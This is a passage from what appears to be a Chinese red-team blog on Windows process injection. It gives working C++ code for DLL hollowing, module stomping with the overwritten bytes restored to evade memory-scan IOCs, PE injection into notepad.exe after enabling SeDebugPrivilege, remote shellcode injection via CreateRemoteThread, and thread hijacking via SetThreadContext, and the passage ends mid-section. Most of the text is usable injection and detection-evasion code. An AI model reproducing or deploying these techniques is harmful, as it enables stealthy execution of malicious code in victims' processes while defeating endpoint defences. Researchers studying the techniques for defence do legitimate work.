class=\"code\"><pre><span class=\"line\">PVOID load_target_dll(const char* dll_name)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">#ifdef CLASSIC_HOLLOWING</span><br><span class=\"line\">\tstd::cout &lt;&lt; &quot;[*] Loading the DLL (using LoadLibary)...\\n&quot;;</span><br><span class=\"line\">\t&#x2F;&#x2F;return LoadLibraryA(dll_name);</span><br><span class=\"line\">\treturn LoadLibraryEx(dll_name, NULL, DONT_RESOLVE_DLL_REFERENCES);</span><br><span class=\"line\">#else</span><br><span class=\"line\">\tstd::cout &lt;&lt; &quot;[*] Mapping the DLL image...\\n&quot;;</span><br><span class=\"line\">\treturn map_dll_image(dll_name);</span><br><span class=\"line\">#endif</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">-------------------------------------------------------------------------------</span><br><span class=\"line\">PVOID map_dll_image(const char* dll_name)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\t&#x2F;&#x2F; 创建合法Dll文件对象</span><br><span class=\"line\">\tHANDLE hFile &#x3D; CreateFileA(dll_name,</span><br><span class=\"line\">\t\tGENERIC_READ,</span><br><span class=\"line\">\t\t0,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tOPEN_EXISTING,</span><br><span class=\"line\">\t\tFILE_ATTRIBUTE_NORMAL,</span><br><span class=\"line\">\t\tNULL</span><br><span class=\"line\">\t);</span><br><span class=\"line\">\tHANDLE hSection &#x3D; nullptr;</span><br><span class=\"line\">\t&#x2F;&#x2F; 为文件对象创建一个section</span><br><span class=\"line\">\tNTSTATUS status &#x3D; NtCreateSection(&amp;hSection,</span><br><span class=\"line\">\t\tSECTION_ALL_ACCESS,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\t0,</span><br><span class=\"line\">\t\tPAGE_READONLY,</span><br><span class=\"line\">\t\tSEC_IMAGE,</span><br><span class=\"line\">\t\thFile</span><br><span class=\"line\">\t);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDWORD protect &#x3D; PAGE_EXECUTE_READWRITE;</span><br><span class=\"line\">\tPVOID sectionBaseAddress &#x3D; NULL;</span><br><span class=\"line\">\tSIZE_T viewSize &#x3D; 0;</span><br><span class=\"line\">\tSECTION_INHERIT inheritDisposition &#x3D; ViewShare; &#x2F;&#x2F;VIEW_SHARE</span><br><span class=\"line\">\t&#x2F;&#x2F; 将section映射到内存中</span><br><span class=\"line\">\tif ((status &#x3D; NtMapViewOfSection(hSection,</span><br><span class=\"line\">\t\tNtCurrentProcess(),</span><br><span class=\"line\">\t\t&amp;sectionBaseAddress,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\t&amp;viewSize,</span><br><span class=\"line\">\t\tinheritDisposition,</span><br><span class=\"line\">\t\tNULL,</span><br><span class=\"line\">\t\tprotect)</span><br><span class=\"line\">\t\t) !&#x3D; STATUS_SUCCESS)</span><br><span class=\"line\">\t&#x2F;&#x2F; 返回基址</span><br><span class=\"line\">\treturn sectionBaseAddress;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>效果：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720374014934.png\" alt=\"QQ_1720374014934\"></p>\n<h3 id=\"Module-Stomping\"><a href=\"#Module-Stomping\" class=\"headerlink\" title=\"Module Stomping\"></a>Module Stomping</h3><p>模块踩踏原理同上面二者，主要区别为Stomping不再执行复杂的PE展开、获取偏移、执行入口，而是直接将shellcode覆写到合法Dll中的区域，并且直接执行，由PE加载转为了直接的shellcode加载。</p>\n<p>特点：<strong>将 shellcode 写入到section中，直接获取地址执行</strong></p>\n<p>流程如图：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720453398400.png\" alt=\"QQ_1720453398400\"></p>\n<p>关键代码，通过LoadLibraryEx获取Dll基址，再获取入口点地址，然后覆写、执行shellcode</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">DWORD oldProtect &#x3D; 0;</span><br><span class=\"line\">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">memcpy(entryPointAddress, shellcode, length);</span><br><span class=\"line\">memset(shellcode, 0, length);</span><br><span class=\"line\">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class=\"line\">HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);</span><br><span class=\"line\">WaitForSingleObject(hThread, INFINITE);</span><br></pre></td></tr></table></figure>\n\n<p>效果，检测的IOC发现.text段的改变，该问题产生原因是由于覆写shellcode导致检测到磁盘中Dll与内存中的.text段内容不同。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720452184625.png\" alt=\"QQ_1720452184625\"></p>\n<p>入口点被覆写为shellcode</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720452376761.png\" alt=\"QQ_1720452376761\"></p>\n<p>为了去除shellcode在内存中的痕迹，可以在执行完shellcode后，将原始内容进行填充，这样避免这一IOC。</p>\n<p>流程图如下：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/QQ_1720453700693.png\" alt=\"QQ_1720453700693\"></p>\n<p>关键代码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsigned char* buffer &#x3D; new unsigned char[length];</span><br><span class=\"line\">memcpy(buffer, entryPointAddress, length);</span><br><span class=\"line\">DWORD oldProtect &#x3D; 0;</span><br><span class=\"line\">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READWRITE, &amp;oldProtect);</span><br><span class=\"line\">memcpy(entryPointAddress, shellcode, length);</span><br><span class=\"line\">memset(shellcode, 0, length);</span><br><span class=\"line\">HANDLE hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)entryPointAddress, NULL, 0, NULL);</span><br><span class=\"line\">Sleep(2000);</span><br><span class=\"line\">memmove(entryPointAddress,buffer,length);</span><br><span class=\"line\">VirtualProtect((LPVOID)entryPointAddress, length, PAGE_EXECUTE_READ, &amp;oldProtect);</span><br><span class=\"line\">cout &lt;&lt; &quot;[*] Done&quot; &lt;&lt; endl;</span><br><span class=\"line\">WaitForSingleObject(hThread, INFINITE);</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关于远程注入\"><a href=\"#关于远程注入\" class=\"headerlink\" title=\"关于远程注入\"></a>关于远程注入</h3><p>上面所有的DLL Hollowing例子都是自身进程在没有开启CFG（Control Flow Guard）时才能正常运行，在实现远程进程注入时，如果目标开启CFG保护，会抛出CFG异常从而运行失败，关于更多CFG下篇再学习。</p>\n<h1 id=\"参考\"><a href=\"#参考\" class=\"headerlink\" title=\"参考\"></a>参考</h1><p><a href=\"https://bbs.kanxue.com/thread-274131.htm\">实战dll注入(原理, 踩坑及排雷)</a></p>\n<p>反射Dll：</p>\n<p><a href=\"https://www.cnblogs.com/h2zZhou/p/7721797.html\">DLL注入新姿势：反射式DLL注入研究 - h2z</a></p>\n<p><a href=\"https://xz.aliyun.com/t/11072?time__1311=mqmx0DyDuDBDcDAxxBuQx2GUQ40ITvhRAD&alichlgref=https://\">深入理解反射式dll注入技术</a></p>\n<p><a href=\"https://xz.aliyun.com/t/14639?time__1311=mqmx9Q0=uGDsD7CG7bTDteD=yoC+DQwD&alichlgref=https://cn.bing.com/\">反射DLL注入原理解析</a></p>\n<p><a href=\"https://github.com/sud01oo/ProcessInjection\">https://github.com/sud01oo/ProcessInjection</a></p>\n<p>DLL Hollowing：</p>\n<p><a href=\"https://naksyn.com/edr%20evasion/2023/06/01/improving-the-stealthiness-of-memory-injections.html\">Improving the stealthiness of memory injections techniques</a></p>\n<p><a href=\"https://www.blackhillsinfosec.com/dll-jmping/\">DLL Jmping: Old Hollow Trampolines in Windows DLL Land</a></p>\n<p><a href=\"https://trustedsec.com/blog/burrowing-a-hollow-in-a-dll-to-hide\">Burrowing a Hollow in a DLL to Hide</a></p>\n<p><a href=\"https://www.forrest-orr.net/post/malicious-memory-artifacts-part-i-dll-hollowing\">Masking Malicious Memory Artifacts – Part I: Phantom DLL Hollowing</a></p>\n<p><a href=\"https://www.secforce.com/blog/dll-hollowing-a-deep-dive-into-a-stealthier-memory-allocation-variant/\">DLL Hollowing</a></p>\n<p><a href=\"https://blog.f-secure.com/hiding-malicious-code-with-module-stomping/\">Hiding malicious code with “Module Stomping”</a></p>\n<p>映射注入：</p>\n<p><a href=\"https://idiotc4t.com/code-and-dll-process-injection/mapping-injection\">https://idiotc4t.com/code-and-dll-process-injection/mapping-injection</a></p>\n<p><a href=\"https://github.com/izj007/wechat/blob/main/articles/%5Bsnowming%5D-2021-8-15-%E4%BD%BF%E7%94%A8%E6%96%87%E4%BB%B6%E6%98%A0%E5%B0%84%E8%BF%9B%E8%A1%8C%E8%BF%9C%E7%A8%8B%E8%BF%9B%E7%A8%8B%E6%B3%A8%E5%85%A5.md\">使用文件映射进行远程进程注入</a></p>\n<p>CFG：</p>\n<p><a href=\"https://bbs.kanxue.com/thread-277740.htm\">利用CFG寻找潜在的ShellCode内存</a></p>\n","categories":["Red-Team"]},{"title":"Process-Inject-贰","url":"/2024/09/03/Process-Injection2/","content":"<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/darkwork.jpg\" alt=\"darkwork\"></p>\n<a id=\"more\"></a>\n\n<h1 id=\"总结\"><a href=\"#总结\" class=\"headerlink\" title=\"总结\"></a>总结</h1><p>学习代码放在：<a href=\"https://github.com/yongsheng220/ProcessInject\">https://github.com/yongsheng220/ProcessInject</a></p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">名称</th>\n<th align=\"center\">概述</th>\n<th align=\"left\">Windows APIs</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">经典DLL注入</td>\n<td align=\"center\">通过dll落地，远程调用LoadLibrary加载恶意dll</td>\n<td align=\"left\">OpenProcess<br />VirtualAllocEx<br />WriteProcessMemory<br />CreateRemoteThread<br />LoadLibrary</td>\n</tr>\n<tr>\n<td align=\"center\">反射DLL注入</td>\n<td align=\"center\">通过远程调用自定义ReflectiveLoader函数模拟PE加载过程</td>\n<td align=\"left\">OpenProcess<br />VirtualAllocEx<br />WriteProcessMemory<br />CreateRemoteThread</td>\n</tr>\n<tr>\n<td align=\"center\">Dll Hollowing</td>\n<td align=\"center\">通过镂空加载的合法DLL，执行恶意代码</td>\n<td align=\"left\">LoadLibraryEx<br />NtCreateSection + NtMapViewOfSection<br />CreateThread</td>\n</tr>\n<tr>\n<td align=\"center\">PE注入</td>\n<td align=\"center\">通过将恶意PE写到远程目标后，创建线程执行恶意方法</td>\n<td align=\"left\">OpenProcess<br />VirtualAllocEx<br />WriteProcessMemory<br />CreateRemoteThread</td>\n</tr>\n<tr>\n<td align=\"center\">线程注入</td>\n<td align=\"center\">通过暂停远程线程，将eip/rip指向写入的shellcode</td>\n<td align=\"left\">OpenThread<br />SuspendThread<br />VirtualAllocEx<br />WriteProcessMemory<br />SetThreadContext<br />ResumeThread</td>\n</tr>\n<tr>\n<td align=\"center\">APC注入</td>\n<td align=\"center\">APC机制执行</td>\n<td align=\"left\">OpenProcess/OpenThread<br />VirtualAllocEx<br />WriteProcessMemory<br />QueueUserAPC</td>\n</tr>\n<tr>\n<td align=\"center\">TLS注入</td>\n<td align=\"center\">TLS机制执行</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td align=\"center\">Process Hollowing</td>\n<td align=\"center\">通过创建挂起进程，卸载源PE，写入恶意PE</td>\n<td align=\"left\">CreateProcess<br />NtUnmapViewOfSection<br />VirtualAllocEx<br />WriteProcessMemory</td>\n</tr>\n<tr>\n<td align=\"center\">Process Overwriting</td>\n<td align=\"center\">直接将恶意PE覆写源PE</td>\n<td align=\"left\">CreateProcess<br />VirtualProtectEx<br />WriteProcessMemory<br />ResumeThread</td>\n</tr>\n<tr>\n<td align=\"center\">Process Stomping</td>\n<td align=\"center\">将shellcode写到滥用RWX属性的PE中</td>\n<td align=\"left\">CreateProcess <br />WriteProcessMemory<br />ResumeThread</td>\n</tr>\n<tr>\n<td align=\"center\">Process Doppelganging</td>\n<td align=\"center\">利用事务NTFS回滚特性，优化内存属性</td>\n<td align=\"left\">CreateTransaction<br />CreateFileTransactedW<br />RollbackTransaction<br />NtCreateProcessEx<br />NtCreateThreadEx</td>\n</tr>\n<tr>\n<td align=\"center\">Transacted Hollowing</td>\n<td align=\"center\">Hollowing 和 Doppelganging的综合优化</td>\n<td align=\"left\"></td>\n</tr>\n<tr>\n<td align=\"center\">Process Ghosting</td>\n<td align=\"center\">利用文件删除标志位，”无文件”落地</td>\n<td align=\"left\">NtSetInformationFile<br />NtCreateProcessEx<br />NtCreateThreadEx</td>\n</tr>\n<tr>\n<td align=\"center\">Ghostly Hollowing</td>\n<td align=\"center\">Process Ghosting优化</td>\n<td align=\"left\"></td>\n</tr>\n</tbody></table>\n<h1 id=\"PE注入\"><a href=\"#PE注入\" class=\"headerlink\" title=\"PE注入\"></a>PE注入</h1><p>原理见图：通过 <strong>OpenProcess、VirtualAllocEx、WriteProcessMemory、CreateRemoteThread</strong> 系列API进行远程注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/pe-injection.gif\" alt=\"pe-injection\"></p>\n<h2 id=\"常规注入PE\"><a href=\"#常规注入PE\" class=\"headerlink\" title=\"常规注入PE\"></a>常规注入PE</h2><p>将自身作为携带恶意函数的PE写到目标进程中通过处理重定位表后执行恶意方法</p>\n<p>流程如下：</p>\n<ul>\n<li><p>OpenProcess 打开目标进程</p>\n</li>\n<li><p>VirtualAllocEx 开辟空间</p>\n</li>\n<li><p>修复重定位</p>\n</li>\n<li><p>WriteProcessMemory 写入恶意PE</p>\n</li>\n<li><p>CreateRemoteThread 执行恶意代码</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">#include &lt;Windows.h&gt;</span><br><span class=\"line\">#include &lt;iostream&gt;</span><br><span class=\"line\">#include &lt;tlhelp32.h&gt;</span><br><span class=\"line\"></span><br><span class=\"line\">using namespace std;</span><br><span class=\"line\"></span><br><span class=\"line\">typedef struct BASE_RELOCATION_ENTRY &#123;</span><br><span class=\"line\">    USHORT Offset : 12;</span><br><span class=\"line\">    USHORT Type : 4;</span><br><span class=\"line\">&#125; BASE_RELOCATION_ENTRY, * PBASE_RELOCATION_ENTRY;</span><br><span class=\"line\">&#x2F;&#x2F; 恶意方法</span><br><span class=\"line\">DWORD InjectionEntryPoint()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    CHAR moduleName[128] &#x3D; &quot;&quot;;</span><br><span class=\"line\">    GetModuleFileNameA(NULL, moduleName, sizeof(moduleName));</span><br><span class=\"line\">    MessageBoxA(NULL, moduleName, &quot;Obligatory PE Injection&quot;, NULL);</span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">BOOL PrivilegeEscalation()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    HANDLE hToken;</span><br><span class=\"line\">    LUID luid;</span><br><span class=\"line\">    TOKEN_PRIVILEGES tp;</span><br><span class=\"line\">    OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &amp;hToken);</span><br><span class=\"line\">    LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &amp;luid);</span><br><span class=\"line\">    tp.PrivilegeCount &#x3D; 1;</span><br><span class=\"line\">    tp.Privileges[0].Attributes &#x3D; SE_PRIVILEGE_ENABLED;</span><br><span class=\"line\">    tp.Privileges[0].Luid &#x3D; luid;</span><br><span class=\"line\">    if (!AdjustTokenPrivileges(hToken, 0, &amp;tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) &#123;</span><br><span class=\"line\">        CloseHandle(hToken);</span><br><span class=\"line\">        return FALSE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    else &#123;</span><br><span class=\"line\">        cout &lt;&lt; &quot;[+]提权成功&quot; &lt;&lt; endl;</span><br><span class=\"line\">        return TRUE;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">DWORD GetProcessPID(LPCSTR lpProcessName)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    DWORD rPid &#x3D; 0;</span><br><span class=\"line\">    &#x2F;&#x2F; 初始化结构体信息，用于枚举进程</span><br><span class=\"line\">    PROCESSENTRY32 processEntry;</span><br><span class=\"line\">    processEntry.dwSize &#x3D; sizeof(PROCESSENTRY32);</span><br><span class=\"line\"></span><br><span class=\"line\">    HANDLE lpSnapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);</span><br><span class=\"line\">    if (lpSnapshot &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]创建快照失败&quot; &lt;&lt; endl; return 0; &#125;</span><br><span class=\"line\">    if (Process32First(lpSnapshot, &amp;processEntry)) &#123;</span><br><span class=\"line\">        do &#123;</span><br><span class=\"line\">            if (lstrcmp(processEntry.szExeFile, lpProcessName) &#x3D;&#x3D; 0) &#123;</span><br><span class=\"line\">                rPid &#x3D; processEntry.th32ProcessID;</span><br><span class=\"line\">                break;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; while (Process32Next(lpSnapshot, &amp;processEntry));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    CloseHandle(lpSnapshot);</span><br><span class=\"line\">    cout &lt;&lt; &quot;[*]PID: &quot; &lt;&lt; rPid &lt;&lt; endl;</span><br><span class=\"line\">    return rPid;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    LPCSTR name &#x3D; &quot;notepad.exe&quot;;</span><br><span class=\"line\">    &#x2F;&#x2F; 提升当前进程权限</span><br><span class=\"line\">    if (!PrivilegeEscalation()) &#123; cout &lt;&lt; &quot;[-]提升权限失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    PVOID imageBase &#x3D; GetModuleHandle(NULL);</span><br><span class=\"line\">    PIMAGE_DOS_HEADER dosHeader &#x3D; (PIMAGE_DOS_HEADER)imageBase;</span><br><span class=\"line\">    PIMAGE_NT_HEADERS ntHeader &#x3D; (PIMAGE_NT_HEADERS)((BYTE*)imageBase + dosHeader-&gt;e_lfanew);</span><br><span class=\"line\"></span><br><span class=\"line\">    PVOID localImage &#x3D; VirtualAlloc(NULL, ntHeader-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_READWRITE);</span><br><span class=\"line\">    memcpy(localImage, imageBase, ntHeader-&gt;OptionalHeader.SizeOfImage);</span><br><span class=\"line\"></span><br><span class=\"line\">    DWORD Pid &#x3D; GetProcessPID(name);</span><br><span class=\"line\">    if (Pid &#x3D;&#x3D; 0) &#123; cout &lt;&lt; &quot;[-]获取PID失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(MAXIMUM_ALLOWED, FALSE, Pid);</span><br><span class=\"line\">    if (hProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]打开进程失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    PVOID tarImageBase &#x3D; VirtualAllocEx(hProcess, NULL, ntHeader-&gt;OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    DWORD_PTR offset &#x3D; (DWORD_PTR)tarImageBase - (DWORD_PTR)imageBase;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[*]tarImageBase: &quot; &lt;&lt; tarImageBase &lt;&lt; endl;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[*]localImage: &quot; &lt;&lt; localImage &lt;&lt; endl;</span><br><span class=\"line\">    cout &lt;&lt; &quot;[*]Offset: &quot; &lt;&lt; hex &lt;&lt; offset &lt;&lt; endl;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;获取重定位表</span><br><span class=\"line\">    PIMAGE_BASE_RELOCATION relocationTable &#x3D; (PIMAGE_BASE_RELOCATION)((DWORD_PTR)localImage + ntHeader-&gt;OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress);</span><br><span class=\"line\">    DWORD relocationEntriesCount &#x3D; 0;</span><br><span class=\"line\">    PDWORD_PTR patchedAddress;</span><br><span class=\"line\">    PBASE_RELOCATION_ENTRY relocationRVA &#x3D; NULL;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#x2F;&#x2F;遍历重定位块</span><br><span class=\"line\">    while (relocationTable-&gt;SizeOfBlock &gt; 0)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &#x2F;&#x2F; 获取重定位块中包含的重定位项的数量</span><br><span class=\"line\">        relocationEntriesCount &#x3D; (relocationTable-&gt;SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) &#x2F; sizeof(USHORT);</span><br><span class=\"line\">        relocationRVA &#x3D; (PBASE_RELOCATION_ENTRY)(relocationTable + 1);</span><br><span class=\"line\"></span><br><span class=\"line\">        for (short i &#x3D; 0; i &lt; relocationEntriesCount; i++)</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            if (relocationRVA[i].Offset)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                patchedAddress &#x3D; (PDWORD_PTR)((DWORD_PTR)localImage + relocationTable-&gt;VirtualAddress + relocationRVA[i].Offset);</span><br><span class=\"line\">                *patchedAddress +&#x3D; offset;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        relocationTable &#x3D; (PIMAGE_BASE_RELOCATION)((DWORD_PTR)relocationTable + relocationTable-&gt;SizeOfBlock);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    WriteProcessMemory(hProcess, tarImageBase, localImage, ntHeader-&gt;OptionalHeader.SizeOfImage, NULL);</span><br><span class=\"line\">    &#x2F;&#x2F;memset(localImage, 0, ntHeader-&gt;OptionalHeader.SizeOfImage);</span><br><span class=\"line\">    VirtualFree(localImage, 0, MEM_RELEASE);</span><br><span class=\"line\">    </span><br><span class=\"line\">    &#x2F;&#x2F; 本地InjectionEntryPoint + offset &#x3D; 远程InjectionEntryPoint</span><br><span class=\"line\">    HANDLE hRemoteHandle &#x3D; CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)((DWORD_PTR)InjectionEntryPoint + offset), NULL, 0, NULL);</span><br><span class=\"line\">    if (hRemoteHandle &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]创建远程线程失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\">    WaitForSingleObject(hRemoteHandle, INFINITE);</span><br><span class=\"line\">    CloseHandle(hRemoteHandle);</span><br><span class=\"line\"></span><br><span class=\"line\">    return 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/image-20240831234806964.png\" alt=\"image-20240831234806964\"></p>\n<h2 id=\"变体注入shellcode\"><a href=\"#变体注入shellcode\" class=\"headerlink\" title=\"变体注入shellcode\"></a>变体注入shellcode</h2><p>如果只执行shellcode，就不用繁杂的处理PE，只要远程写入、远程调用即可。</p>\n<p>流程如下：</p>\n<ul>\n<li><p>OpenProcess 打开目标进程</p>\n</li>\n<li><p>VirtualAllocEx 开辟空间</p>\n</li>\n<li><p>WriteProcessMemory 写入shellcode</p>\n</li>\n<li><p>CreateRemoteThread 执行shellcode</p>\n</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">int main()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &#x2F;&#x2F; 提升当前进程权限</span><br><span class=\"line\">    if (!PrivilegeEscalation()) &#123;cout &lt;&lt; &quot;[-]提升权限失败&quot; &lt;&lt; endl;return 1;&#125;</span><br><span class=\"line\">    &#x2F;&#x2F; 要注入的进程名字</span><br><span class=\"line\">    LPCSTR tname &#x3D; &quot;notepad.exe&quot;;</span><br><span class=\"line\">    DWORD Pid &#x3D; GetProcessPID(tname);</span><br><span class=\"line\">    if (Pid &#x3D;&#x3D; NULL) &#123; cout &lt;&lt; &quot;[-]获取PID失败&quot; &lt;&lt; endl; return 1; &#125;</span><br><span class=\"line\">    HANDLE hProcess &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, Pid);</span><br><span class=\"line\">    if (hProcess &#x3D;&#x3D; INVALID_HANDLE_VALUE)&#123;cout &lt;&lt; &quot;[-]打开进程失败&quot; &lt;&lt; endl;return 1;&#125;</span><br><span class=\"line\">    SIZE_T length &#x3D; sizeof(shellcode);</span><br><span class=\"line\">    LPVOID pshellcode &#x3D; VirtualAllocEx(hProcess, NULL, length, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">    WriteProcessMemory(hProcess, pshellcode, shellcode, length, NULL);</span><br><span class=\"line\">    HANDLE hRemoteHandle &#x3D; CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pshellcode, NULL, 0, NULL);</span><br><span class=\"line\">    WaitForSingleObject(hRemoteHandle, INFINITE);</span><br><span class=\"line\">    CloseHandle(hRemoteHandle);</span><br><span class=\"line\">\treturn 0;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"线程劫持\"><a href=\"#线程劫持\" class=\"headerlink\" title=\"线程劫持\"></a>线程劫持</h1><p>原理如图：通过  SuspendThread、GetThreadContext、修改上下文eip/rip、SetThreadContext、ResumeThread恢复线程执行shellcode 进行远程注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/Process%20Injection/thread-hijack.gif\" alt=\"thread-hijack\"></p>\n<p>代码：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">unsigned char shellcode[] &#x3D; &quot;&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">LPCSTR name &#x3D; &quot;notepad.exe&quot;;</span><br><span class=\"line\">DWORD targetPID &#x3D; GetProcessPID(name);</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE threadHijacked &#x3D; NULL;</span><br><span class=\"line\">THREADENTRY32 threadEntry;</span><br><span class=\"line\">CONTEXT context;</span><br><span class=\"line\">context.ContextFlags &#x3D; CONTEXT_FULL;</span><br><span class=\"line\">threadEntry.dwSize &#x3D; sizeof(THREADENTRY32);</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE targetProcessHandle &#x3D; OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);</span><br><span class=\"line\">if (targetProcessHandle &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]打开进程失败&quot; &lt;&lt; endl; return 0; &#125;</span><br><span class=\"line\">PVOID remoteBuffer &#x3D; VirtualAllocEx(targetProcessHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</span><br><span class=\"line\">WriteProcessMemory(targetProcessHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);</span><br><span class=\"line\"></span><br><span class=\"line\">HANDLE snapshot &#x3D; CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);</span><br><span class=\"line\">Thread32First(snapshot, &amp;threadEntry);</span><br><span class=\"line\"></span><br><span class=\"line\">while (Thread32Next(snapshot, &amp;threadEntry))</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    if (threadEntry.th32OwnerProcessID &#x3D;&#x3D; targetPID)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        threadHijacked &#x3D; OpenThread(THREAD_ALL_ACCESS, FALSE, threadEntry.th32ThreadID);</span><br><span class=\"line\">        if (threadHijacked &#x3D;&#x3D; INVALID_HANDLE_VALUE) &#123; cout &lt;&lt; &quot;[-]打开线程失败&quot; &lt;&lt; endl; return 0; &#125;</span><br><span class=\"line\">        break;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">SuspendThread(threadHijacked);</span><br><span class=\"line\"></span><br><span class=\"line\">GetThreadContext(threadHijacked, &amp;context);</span><br><span class=\"line\">context.Rip &#x3D; (DWORD_PTR)remoteBuffer;</span><br><span class=\"line\">SetThreadContext(threadHijacked, &amp;context);</span><br><span class=\"line\"></span><br><span class=\"line\">ResumeThread(threadHijacked);</span><br><span class=\"line\"></span><br><span class=\"line\">return 0;</span><br></pre></td></tr></table></figure>\n\n\n\n<h1 id=\"APC注入\"><a href=\"#APC注入\" class=\"headerlink\" 